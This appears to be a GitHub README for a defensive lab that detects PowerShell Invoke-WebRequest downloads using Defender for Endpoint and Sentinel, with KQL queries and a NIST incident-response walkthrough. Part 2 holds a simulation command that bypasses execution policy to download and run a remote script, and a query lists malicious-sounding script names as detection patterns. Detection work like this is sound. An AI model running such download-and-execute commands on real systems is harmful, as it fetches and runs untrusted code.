# PowerShell Suspicious Web Request & Incident Response Lab

<img width="1012" height="570" alt="Screenshot 2025-08-18 at 10 48 02 AM" src="https://github.com/user-attachments/assets/62083b32-e14c-49fd-b0e2-6ffb48aba3df" />

## 📖 Overview
This project demonstrates how **malicious PowerShell activity** involving **suspicious web requests** can be **detected** and **investigated** using **Microsoft Defender for Endpoint (MDE)** telemetry combined with **Microsoft Sentinel**. The workflow begins with raw event collection (**DeviceProcessEvents**) and progresses through building **analytics rules**, triggering **alerts**, and performing **incident response** aligned with the **NIST 800-61** framework. The end goal is to illustrate the complete lifecycle: **detection, analysis, containment, eradication, recovery, and post-incident review**.

---

## ⚙️ Environment Setup
The lab environment consisted of:
- **Azure Virtual Machines** onboarded into **Defender for Endpoint**, generating **process execution logs**.  
- **Microsoft Sentinel** connected to a **Log Analytics Workspace** for **log ingestion** and **SIEM functionality**.  
- **Analytics Rules** configured to **detect suspicious PowerShell web requests** and **automatically generate incidents**.  

All **DeviceProcessEvents** generated from **process execution on the VM** were forwarded into Sentinel, enabling **correlation** across multiple entities (**Accounts, Hosts, Process Commands**).

---

## 🔍 Part 1 — Detection (Suspicious PowerShell Web Request)
Sometimes when a bad actor has access to a system, they attempt to download malicious payloads or tools directly from the internet. This is often achieved with **PowerShell’s `Invoke-WebRequest`** command. By monitoring these requests, defenders can identify potential **malware downloads** or **C2 communication**.

**Sentinel Scheduled Query Rule:**
```kql
    let TargetHostname = "john-smith"; // Replace with the name of your VM as it shows up in the logs
    DeviceProcessEvents
    | where DeviceName == TargetHostname // comment this line out for MORE results
    | where FileName == "powershell.exe"
    | where InitiatingProcessCommandLine contains "Invoke-WebRequest"
    | order by TimeGenerated
```
<img width="1131" height="246" alt="Screenshot 2025-08-18 at 10 57 55 AM" src="https://github.com/user-attachments/assets/56ec11bf-b061-4767-b201-280060d5526b" />


**Scheduled Analytics Rule Settings:**
- **Rule frequency:** every 4 hours  
- **Lookup time window:** 24 hours  
- **Alert suppression:** stop after firing until reset  
- **Entity mappings:**  
  - **Account → AccountName**  
  - **Host → DeviceName**  
  - **Process → ProcessCommandLine**  
- **Incident grouping:** single case per 24 hours  
- **MITRE ATT&CK mapping:**  
  - **Tactic:** Execution / Command & Control  
  - **Technique:** PowerShell (T1059.001), Application Layer Protocol (T1071)  

---

## 🚨 Part 2 — Alert & Incident Creation
Once the **query** is validated, the **analytics rule** is enabled in **Sentinel**. The system autonomously generates **alerts** when suspicious PowerShell web requests are detected.  

If natural logs don’t exist, a **simulation** can be run from the VM:
```
    powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
    powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```
This triggers the **analytics rule**, producing a new **alert** that automatically escalates into an **incident** within Sentinel.
<img width="832" height="578" alt="Screenshot 2025-08-18 at 11 27 11 AM" src="https://github.com/user-attachments/assets/4ec78cc9-7353-420e-b488-6c43f1ea8d9c" />

---

## 🛠️ Part 3 — Incident Response Lifecycle
The incident was worked in accordance with the **NIST 800-61** standard.

### Preparation
- **Monitoring rules, tools, and training** were pre-established.  
- **Roles and responsibilities** were documented ahead of time.  

### Detection & Analysis
The **PowerShell Suspicious Web Request** incident was triggered from activity on the **johnsmith**.  

To determine if any downloaded scripts were executed, the following **investigative query** was used:
```kql
    let TargetHostname = "john-smith"; 
    let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
    DeviceProcessEvents
    | where DeviceName == TargetHostname
    | where FileName == "powershell.exe"
    | where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
    | order by TimeGenerated
    | project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
This query checks if **any downloaded scripts** were subsequently **executed**.

### Containment, Eradication, and Recovery
- **Containment:** The VM was isolated via **Defender for Endpoint** to stop further communication.  
- **Eradication:** Anti-malware scans were run on the isolated system.  
- **Recovery:** Since execution was simulated, no real threat persisted, but in a real case the **malicious files would be removed** and the **system restored**.

### Post-Incident Activities
- Documented that suspicious scripts were downloaded via **Invoke-WebRequest**.  
- Recommended enforcing a **policy restricting PowerShell usage** unless explicitly required.  
- Lessons learned: **Attackers abuse legitimate tools (LOLBins)** like PowerShell to bypass defenses.

### Closure
The incident was marked as a **True Positive** simulation. Documentation and notes were finalized, and the case was **closed** in Sentinel.

## 📑 Findings & Notes
- **Suspicious PowerShell web requests** were detected using the **DeviceProcessEvents** table.  
- **Invoke-WebRequest** was used to download test scripts (e.g., `eicar.ps1`).  
- No malicious execution occurred beyond the simulated scenario.  
- Demonstrated the value of **MITRE ATT&CK mapping** and **structured incident response** in identifying post-exploitation activity.  

